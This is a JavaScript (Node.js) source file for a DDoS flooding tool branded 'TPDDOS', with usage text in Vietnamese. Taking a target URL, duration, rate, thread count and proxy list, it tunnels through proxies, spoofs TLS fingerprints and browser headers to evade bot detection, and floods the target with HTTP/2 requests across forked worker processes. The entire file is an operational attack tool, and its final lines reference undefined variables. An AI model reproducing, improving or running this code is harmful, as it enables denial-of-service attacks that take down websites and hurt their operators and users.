const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const scp = require("set-cookie-parser");
var colors = require("colors");
const randomUseragent = require('random-useragent');
const gradient = require('gradient-string');
const separator = gradient.pastel('='.repeat(70));
const title = gradient.rainbow(colors.bold('🔥🔥 DDoS Attack TPDDOS 🔥🔥'));
const label = colors.brightMagenta.bold;
const value = colors.brightGreen.bold;
const noteLabel = colors.brightCyan.bold('⚠️  Lưu ý : ');
const arrow = colors.yellow('➤');
const logo = gradient.vice.multiline([
    '_________ _______  ______   ______   _______  _______ ',
    '\\__   __/(  ____ )(  __  \\ (  __  \\ (  ___  )(  ____ \\',
    '   ) (   | (    )|| (  \\  )| (  \\  )| (   ) || (    \\/',
    '   | |   | (____)|| |   ) || |   ) || |   | || (_____ ',
    '   | |   |  _____)| |   | || |   | || |   | |(_____  )',
    '   | |   | (      | |   ) || |   ) || |   | |      ) |',
    '   | |   | )      | (__/  )| (__/  )| (___) |/\\____) |',
    '   )_(   |/       (______/ (______/ (_______)\\_______)',
    '                                                      ',
].join('\n'));
function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }


const accept_header = [ 
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
"text/html; charset=utf-8", "application/json, text/plain, */*",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
],
cache_header = [
   'max-age=0',
   'no-cache',
   'no-store', 
   'pre-check=0',
   'post-check=0',
   'must-revalidate',
   'proxy-revalidate',
   's-maxage=604800',
   'no-cache, no-store,private, max-age=0, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
   'no-cache, no-store,private, max-age=604800, must-revalidate',
   'no-transform',
   'only-if-cached',
   'public',
   'private',
   'stale-if-error',
   'max-age=31557600',
   'max-age=2592000',
   's-maxage',
   'min-fresh',
   'max-age=31536000,public',
   'max-age=31536000,public,immutable',
   'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
   'public, immutable, max-age=31536000',
   'max-stale',
   'max-age=315360000',
   'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800'

],
Generate_Encoding = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'

],
language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8'
],

dest_header = [
   'audio',
   'audioworklet',
   'document',
   'embed',
   'empty',
   'font',
   'frame',
   'iframe',
   'image',
   'manifest',
   'object',
   'paintworklet',
   'report',
   'script',
   'serviceworker',
   'sharedworker',
   'style',
   'track',
   'video',
   'worker',
   'xslt',
   "unknown",
   "subresource"
],

mode_header = [
   'cors',
   'navigate',
   'no-cors',
   'same-origin',
   'websocket'
],
site_header = [
   'cross-site',
   'same-origin',
   'same-site',
   'none'
],
sec_ch_ua = [
   '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
   '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
   '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
   '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
   '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
   '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
   '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
   '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
   '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
   '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
   '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
   '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"',
   '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"',
   '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
    console.clear();
    console.log(`\n${separator}`);
    console.log(logo);
    console.log(`${separator}`);
    console.log(title);
    console.log(`${separator}\n`);
    console.log(`${arrow} ${value('Bạn Dùng Sai Rồi')}`);
    console.log(`${arrow} ${label('Cách Dùng:')} ${value('node tphatdz <target> <time> <rate> <thread> <proxy>')}`);
    console.log(`\n${separator}`);
    process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function getRandomValue(array) {
    return array[Math.floor(Math.random() * array.length)];
}
const phone = [
"Mozilla/5.0",
"Mozilla/4.0",
];
const operatingSystems = [
    "Windows NT 10.0; Win64; x64",
    "Macintosh; Intel Mac OS X 10_15_7",
    "X11; Linux x86_64",
    "Android 10; Mobile",
    "iPhone; CPU iPhone OS 14_2 like Mac OS X",
    "Windows NT 6.1; Win64; x64",
    "Macintosh; Intel Mac OS X 11_3_0",
    "X11; Linux i686",
    "Android 11; Mobile",
    "iPhone; CPU iPhone OS 15_0 like Mac OS X",
    "Windows NT 11.0; Win64; x64",
    "Macintosh; Intel Mac OS X 12_0_1",
    "X11; Linux x86_64; Ubuntu 22.04",
    "Android 12; Mobile",
    "iPhone; CPU iPhone OS 16_0 like Mac OS X"
];

const architectures = {
    "Windows NT 10.0; Win64; x64": "WOW64",
    "Macintosh; Intel Mac OS X 10_15_7": "x86_64",
    "X11; Linux x86_64": "x86_64",
    "Android 10; Mobile": "armv7l",
    "iPhone; CPU iPhone OS 14_2 like Mac OS X": "arm64",
    "Windows NT 6.1; Win64; x64": "WOW64",
    "Macintosh; Intel Mac OS X 11_3_0": "x86_64",
    "X11; Linux i686": "i686",
    "Android 11; Mobile": "armv8",
    "iPhone; CPU iPhone OS 15_0 like Mac OS X": "arm64",
    "Windows NT 11.0; Win64; x64": "WOW64",
    "Macintosh; Intel Mac OS X 12_0_1": "x86_64",
    "X11; Linux x86_64; Ubuntu 22.04": "x86_64",
    "Android 12; Mobile": "armv8",            
    "iPhone; CPU iPhone OS 16_0 like Mac OS X": "arm64"
};

const browsers = [
    "Chrome/91.0.4472.124",
    "Safari/537.36",
    "Firefox/89.0",
    "Edge/91.0.864.54",
    "Opera/77.0.4054.172",
    "Chrome/92.0.4515.107",
    "Safari/605.1.15",
    "Firefox/90.0",
    "Edge/92.0.902.62",
    "Opera/78.0.4093.112",
    "Chrome/103.0.5060.114",
    "Safari/605.1.17",  
    "Firefox/91.0",     
    "Edge/103.0.1264.49",
    "Opera/80.0.4170.72"
];

const skid = [
    "10005465237",
    "8851064634",
    "89313646253",
    "2206423942",
    "12635495631",
    "33324455677",
    "44455666788",
    "55566778899",
    "66677889900",
    "77788990011",
    "88899001122",
    "99900112233",
    "11122334455",
    "22233445566",
    "33344556677" 
];
const lol = skid[Math.floor(Math.random() * skid.length)];
const randomPhone = getRandomValue(phone);
const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS];
const randomBrowser = getRandomValue(browsers);
const uap = `${randomPhone}; (${randomOS}; ${lol}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`;

const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";"GREASE:X25519:x25519";

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";"TLSv1_3_method","TLS_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const rateHeaders = [
   { "akamai-origin-hop": randstr(5)},
   { "source-ip": randstr(5)  },
   { "via": randstr(5)  },
   { "cluster-ip": randstr(5)  },
   { "upgrade-insecure-request" : "1"},
   {"accept": accept_header[Math.floor(Math.random()*accept_header.length)]},
   {"accept-charset" : accept_header[Math.floor(Math.random()*accept_header.length)]},
   {"Cache-Control" : cache_header[Math.floor(Math.random()*cache_header.length)]},
   {"pragma" : "no-cache"},
   {"x-xss-protection" : "1;mode=block"}, 
   {"x-content-type-options" : "nosniff"},
   {'accept-datetime' : accept_header[Math.floor(Math.random()*accept_header.length)]},
   ];
   const rateHeaders2 = [
   { "akamai-origin-hop": randstr(5)  },
   { "source-ip": randstr(5)  },
   { "via": randstr(5)  },
   {"X-Vercel-Cache": randstr(5) },
   { "cluster-ip": randstr(5)  },
   {"X-Requested-With": 'XMLHttpRequest'},
   {"X-Frame-Options": "deny"},
   {'Max-Forwards': '10'},
   {'Refresh': '5'},
   {'accept-language' : language_header[Math.floor(Math.random()*language_header.length)]},
   {'accept-encoding' : Generate_Encoding[Math.floor(Math.random()*Generate_Encoding.length)]}
   ];
const dynHeaders = {
   ...headers,
   ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
   ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
 };
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.clear();
        console.log(`\n${separator}`);
        console.log(logo);
        console.log(`${separator}`);
        console.log(title);
        console.log(`${separator}\n`);
        console.log(`${arrow} ${label('Target:')} ${value(process.argv[2])}`);
        console.log(`${arrow} ${label('Time:')} ${value(process.argv[3])}`);
        console.log(`${arrow} ${label('Rate:')} ${value(process.argv[4])}`);
        console.log(`${arrow} ${label('Thread(s):')} ${value(process.argv[5])}`);
        console.log(`${arrow} ${label('ProxyFile:')} ${value(args.proxyFile)} ${colors.white.bold('|')} ${label('Total Proxies:')} ${value(proxies.length)}`);
        console.log(`\n${separator}`);
       cluster.fork();

   }
} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 1) }}

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function cookieString(cookie) {
   var s = "";
   for (var c in cookie) {
     s = `${s} ${cookie[c].name}=${cookie[c].value};`;
   }
   var s = s.substring(1);
   return s.substring(0, s.length - 1);
 }

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}


function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"

    let userAgent = randomUseragent.getRandom(function (ua) {
       return ua.browserName === 'Firefox';
   });

   let headers = {
       ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
       ":method": "GET",
       "referer" : "https://" + parsedTarget.host + parsedTarget.path,
       "Accept" : accept_header[Math.floor(Math.random() * accept_header.length)],
       ":path": parsedTarget.path + "?tphatdzflood",
       ":scheme": "https",
       "x-requested-with" : "XMLHttpRequest",
       "user-agent": uap,
   }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        const settings = {
           enablePush: false,
           initialWindowSize: 1073741823
       };

        const tlsOptions = {
           port: parsedPort,
           secure: true,
           ALPNProtocols: [
               "h2","h3","http/1.1"
           ],
           ciphers: ciphers,
           sigalgs: sigalgs,
           requestCert: true,
           socket: connection,
           ecdhCurve: ecdhCurve,
           honorCipherOrder: false,
           followAllRedirects: true,
           challengeToSolve: 45,
           clientTimeout: 20000,
           clientlareMaxTimeout: 5000,
           host: parsedTarget.host,
           rejectUnauthorized: false,
           clientCertEngine: "DYNAMIC",
           secureOptions: secureOptions,
           secureContext: secureContext,
           servername: parsedTarget.host,
           secureProtocol: secureProtocol
       };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 100000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
               headerTableSize: 65536,
               maxConcurrentStreams: 1000,
               initialWindowSize: 6291456,
               maxHeaderListSize: 262144,
               enablePush: false
           },
           maxSessionMemory: 3333,
           maxDeflateDynamicTableSize: 4294967295,
           createConnection: () => tlsConn,
           socket: connection,
       });

       client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           maxFrameSize : 40000,
           enablePush: false
       });

       client.setMaxListeners(0);
       client.settings(settings);

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   
                   const request = client.request(headers)
                   
                                   

                   .on("response", response => {
                       if(response['set-cookie']) {
                           headers["cookie"] = cookieString(scp.parse(response["set-cookie"]))
                       }
                       request.close();
                       request.destroy();
                       return
                   });
                   request.end();
               }
           }, 800); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
const client = http2.connect(parsed.href, clientOptions, function() {
 });

